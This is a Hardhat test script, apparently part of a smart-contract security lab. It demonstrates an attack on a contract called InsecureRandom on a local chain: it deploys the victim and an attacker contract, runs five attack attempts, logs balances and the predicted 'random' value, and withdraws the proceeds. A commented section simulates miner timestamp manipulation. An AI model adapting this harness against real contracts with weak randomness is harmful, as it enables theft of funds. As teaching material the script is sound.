import { expect } from "chai";
import { ethers, network } from "hardhat";

describe("InsecureRandom exploit demo (visual)", function () {
  it("Muestra predicted vs random y balances", async function () {
    const [deployer, attackerEOA] = await ethers.getSigners();

    // 1) Deploy victim
    const Victim = await ethers.getContractFactory("InsecureRandom");
    const victim = await Victim.deploy();
    await victim.waitForDeployment();

    // Fund victim
    await deployer.sendTransaction({
      to: await victim.getAddress(),
      value: ethers.parseEther("1.0"),
    });

    // 2) Deploy attacker contract
    const Attacker = await ethers.getContractFactory("InsecureRandomAttacker");
    const attacker = await Attacker.connect(attackerEOA).deploy(await victim.getAddress());
    await attacker.waitForDeployment();

    // Fund attacker contract once
    await attackerEOA.sendTransaction({
      to: await attacker.getAddress(),
      value: ethers.parseEther("0.1"),
    });

    console.log("=== Starting demo ===");
    console.log("Victim address:", await victim.getAddress());
    console.log("Attacker contract address:", await attacker.getAddress());
    console.log("");

    // Print block/timestamp before attempts
    const blockBefore = await ethers.provider.getBlock("latest");
    if (blockBefore) {
      console.log("Block before:", blockBefore.number, "timestamp:", blockBefore.timestamp);
    } else {
      console.error("Failed to fetch the latest block.");
    }

    // 3) Perform several attack attempts and log states
    for (let i = 0; i < 5; i++) {
      // OPTIONAL: show you can change timestamp to simulate miner manipulation
      // const fakeTs = blockBefore.timestamp + i + 10;
      // await network.provider.send("evm_setNextBlockTimestamp", [fakeTs]);

      const tx = await attacker.connect(attackerEOA).attack({ gasLimit: 3_000_000 });
      const receipt = await tx.wait();

      // Print block/timestamp after the tx mined
      if (!receipt) {
        console.error("Transaction receipt is null.");
        return;
      }
      const blk = await ethers.provider.getBlock(receipt.blockNumber);
      if (blk) {
        console.log(`--- Attempt ${i + 1} mined in block ${receipt.blockNumber} ts ${blk.timestamp} ---`);
      } else {
        console.error(`Block information for receipt.blockNumber ${receipt.blockNumber} is null.`);
      }

      // Get victim.lastRandom and show
      const lastRandom = await victim.lastRandom();
      console.log("Victim.lastRandom (on-chain):", lastRandom.toString());

      // Get victim balance and attacker EOA balance
      const victimBal = await ethers.provider.getBalance(await victim.getAddress());
      const attackerEoaBal = await ethers.provider.getBalance(attackerEOA.address);
      const attackerContractBal = await ethers.provider.getBalance(await attacker.getAddress());

      console.log("Victim balance:", ethers.formatEther(victimBal));
      console.log("Attacker contract balance:", ethers.formatEther(attackerContractBal));
      console.log("Attacker EOA balance:", ethers.formatEther(attackerEoaBal));
      console.log("");
    }

    // Withdraw attacker funds to EOA and print final balance
    await attacker.connect(attackerEOA).withdraw();
    const finalAttackerBal = await ethers.provider.getBalance(attackerEOA.address);
    console.log("Final attacker EOA balance:", ethers.formatEther(finalAttackerBal));
  });
});
